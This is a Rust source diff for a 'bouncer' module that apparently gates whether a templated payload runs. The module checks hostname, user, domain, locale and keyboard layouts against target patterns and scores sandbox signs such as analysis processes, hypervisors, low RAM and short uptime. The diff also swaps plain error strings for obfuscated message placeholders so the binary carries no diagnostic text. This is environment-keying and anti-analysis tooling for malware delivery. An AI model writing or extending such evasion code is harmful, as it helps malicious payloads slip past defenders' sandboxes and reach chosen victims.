@@ -38,35 +38,13 @@ const ENV_MIN_RAM_MB: u64 = 2048;
 /// Uptime (minutes) below which a host looks like a sandbox.
 const ENV_MIN_UPTIME_MIN: u64 = 10;
 
-/// Errors produced while reading the host environment.
-///
-/// The numeric payload carries the failing Win32 error, or the API's own return
-/// value when it does not set one.
-#[derive(Debug, thiserror::Error)]
-pub enum BouncerError {
-    #[error("could not read the computer name (error {0})")]
-    ComputerNameFailed(u32),
-    #[error("could not read the user name (error {0})")]
-    UserNameFailed(u32),
-    #[error("could not read the DNS domain (error {0})")]
-    DomainFailed(u32),
-    #[error("could not read the user locale (error {0})")]
-    LocaleFailed(u32),
-    #[error("could not read the active keyboard layouts (error {0})")]
-    KeyboardFailed(u32),
-    #[error("could not enumerate the running processes (error {0})")]
-    ProcessEnumerationFailed(u32),
-    #[error("could not query the physical memory (error {0})")]
-    MemoryQueryFailed(u32),
-}
-
 /// Gate entry point: evaluates the declared checks and returns `false` when the
 /// pipeline must abort (so the payload is not run).
 ///
 /// With no declared check this is a no-op and returns `true`. When
 /// `ON_FAIL_EXIT` is set, a rejection exits the process with code 1 instead of
 /// letting the template exit silently.
-pub fn bouncer() -> Result<bool, BouncerError> {
+pub fn bouncer() -> Result<bool, String> {
     // Declared checks. Each is `None`/empty when the YAML did not set it.
     let hostname_pattern: Option<String> = $HOSTNAME_DEF$;
     let username_pattern: Option<String> = $USERNAME_DEF$;
@@ -246,6 +224,14 @@ fn glob_match(pattern: &str, text: &str) -> bool {
     p == pattern.len()
 }
 
+/// Appends a failed Win32 call's error code to an obfuscated message.
+///
+/// The label is rebuilt from obfuscated bytes at the call site, so this literal
+/// carries no diagnostic text.
+fn win32_error(label: String, code: u32) -> String {
+    format!("{label} (error {code})")
+}
+
 /// Decodes a NUL-terminated UTF-16 buffer, stopping at the first NUL (or at the
 /// end of the buffer when it is not terminated).
 fn wide_to_string(buffer: &[u16]) -> String {
@@ -257,7 +243,7 @@ fn wide_to_string(buffer: &[u16]) -> String {
 }
 
 /// Reads the computer name (`GetComputerNameW`).
-fn computer_name() -> Result<String, BouncerError> {
+fn computer_name() -> Result<String, String> {
     let mut buffer = [0u16; 256];
     let mut size = buffer.len() as u32;
     match unsafe { GetComputerNameW(PWSTR(buffer.as_mut_ptr()), &mut size) } {
@@ -266,12 +252,12 @@ fn computer_name() -> Result<String, BouncerError> {
             crate::tech_dbg!("bouncer", "hostname '{name}'");
             Ok(name)
         }
-        Err(error) => Err(BouncerError::ComputerNameFailed(error.code().0 as u32)),
+        Err(error) => Err(win32_error($MSG_COMPUTER_NAME_FAILED$, error.code().0 as u32)),
     }
 }
 
 /// Reads the user name (`GetUserNameW`).
-fn user_name() -> Result<String, BouncerError> {
+fn user_name() -> Result<String, String> {
     let mut buffer = [0u16; 256];
     let mut size = buffer.len() as u32;
     match unsafe { GetUserNameW(PWSTR(buffer.as_mut_ptr()), &mut size) } {
@@ -280,7 +266,7 @@ fn user_name() -> Result<String, BouncerError> {
             crate::tech_dbg!("bouncer", "user '{name}'");
             Ok(name)
         }
-        Err(error) => Err(BouncerError::UserNameFailed(error.code().0 as u32)),
+        Err(error) => Err(win32_error($MSG_USER_NAME_FAILED$, error.code().0 as u32)),
     }
 }
 
@@ -288,24 +274,24 @@ fn user_name() -> Result<String, BouncerError> {
 ///
 /// A host outside a domain yields an empty string, so a `domain` check then
 /// simply fails instead of erroring.
-fn dns_domain() -> Result<String, BouncerError> {
+fn dns_domain() -> Result<String, String> {
     let mut buffer = [0u16; 256];
     let mut size = buffer.len() as u32;
     match unsafe { GetComputerNameExW(ComputerNameDnsDomain, PWSTR(buffer.as_mut_ptr()), &mut size) }
     {
         Ok(()) => Ok(wide_to_string(&buffer)),
-        Err(error) => Err(BouncerError::DomainFailed(error.code().0 as u32)),
+        Err(error) => Err(win32_error($MSG_DOMAIN_FAILED$, error.code().0 as u32)),
     }
 }
 
 /// Reads the user's default locale (`GetUserDefaultLocaleName`), in BCP-47 form
 /// (e.g. `en-US`).
-fn locale_name() -> Result<String, BouncerError> {
+fn locale_name() -> Result<String, String> {
     // LOCALE_NAME_MAX_LENGTH is 85.
     let mut buffer = [0u16; 85];
     let written = unsafe { GetUserDefaultLocaleName(&mut buffer) };
     if written <= 0 {
-        return Err(BouncerError::LocaleFailed(unsafe { GetLastError().0 }));
+        return Err(win32_error($MSG_LOCALE_FAILED$, unsafe { GetLastError().0 }));
     }
     let locale = wide_to_string(&buffer);
     crate::tech_dbg!("bouncer", "locale '{locale}'");
@@ -318,7 +304,7 @@ fn locale_name() -> Result<String, BouncerError> {
 /// `0C0A` for Spain. Three sources feed the list: `GetKeyboardLayout` for the
 /// calling thread, `GetKeyboardLayoutNameW` for its KLID string (trimmed to the
 /// last four digits) and `GetKeyboardLayoutList` for every loaded layout.
-fn keyboard_layouts() -> Result<Vec<String>, BouncerError> {
+fn keyboard_layouts() -> Result<Vec<String>, String> {
     let mut layouts: Vec<String> = Vec::new();
 
     let current = unsafe { GetKeyboardLayout(0) };
@@ -333,12 +319,12 @@ fn keyboard_layouts() -> Result<Vec<String>, BouncerError> {
 
     let count = unsafe { GetKeyboardLayoutList(None) };
     if count <= 0 {
-        return Err(BouncerError::KeyboardFailed(unsafe { GetLastError().0 }));
+        return Err(win32_error($MSG_KEYBOARD_FAILED$, unsafe { GetLastError().0 }));
     }
     let mut list = vec![HKL(std::ptr::null_mut()); count as usize];
     let filled = unsafe { GetKeyboardLayoutList(Some(&mut list)) };
     if filled <= 0 {
-        return Err(BouncerError::KeyboardFailed(unsafe { GetLastError().0 }));
+        return Err(win32_error($MSG_KEYBOARD_FAILED$, unsafe { GetLastError().0 }));
     }
     for hkl in list.iter().take(filled as usize) {
         layouts.push(format!("{:04X}", hkl.0 as usize as u16));
@@ -411,7 +397,7 @@ fn hypervisor_vendor_present(vendor_tokens: &[String]) -> bool {
 /// low processor count, little physical memory, a short uptime, or a path/user
 /// name that reads like a lab. A score at or above [`ENV_SCORE_THRESHOLD`]
 /// means "looks like a sandbox".
-fn env_score(processes: &[String], tokens: &[String]) -> Result<u32, BouncerError> {
+fn env_score(processes: &[String], tokens: &[String]) -> Result<u32, String> {
     let mut score = 0u32;
 
     if env_process_running(processes)? {
@@ -434,10 +420,10 @@ fn env_score(processes: &[String], tokens: &[String]) -> Result<u32, BouncerErro
 }
 
 /// Whether any process in `names` is running, compared by executable stem.
-fn env_process_running(names: &[String]) -> Result<bool, BouncerError> {
+fn env_process_running(names: &[String]) -> Result<bool, String> {
     let snapshot = match unsafe { CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0) } {
         Ok(handle) => handle,
-        Err(error) => return Err(BouncerError::ProcessEnumerationFailed(error.code().0 as u32)),
+        Err(error) => return Err(win32_error($MSG_PROCESS_ENUM_FAILED$, error.code().0 as u32)),
     };
 
     let mut entry = PROCESSENTRY32W {
@@ -499,14 +485,14 @@ fn cpu_cores() -> u32 {
 }
 
 /// Total physical memory in MiB (`GlobalMemoryStatusEx`).
-fn total_ram_mb() -> Result<u64, BouncerError> {
+fn total_ram_mb() -> Result<u64, String> {
     let mut status = MEMORYSTATUSEX {
         dwLength: core::mem::size_of::<MEMORYSTATUSEX>() as u32,
         ..Default::default()
     };
     match unsafe { GlobalMemoryStatusEx(&mut status) } {
         Ok(()) => Ok(status.ullTotalPhys / 1024 / 1024),
-        Err(error) => Err(BouncerError::MemoryQueryFailed(error.code().0 as u32)),
+        Err(error) => Err(win32_error($MSG_MEMORY_QUERY_FAILED$, error.code().0 as u32)),
     }
 }
 
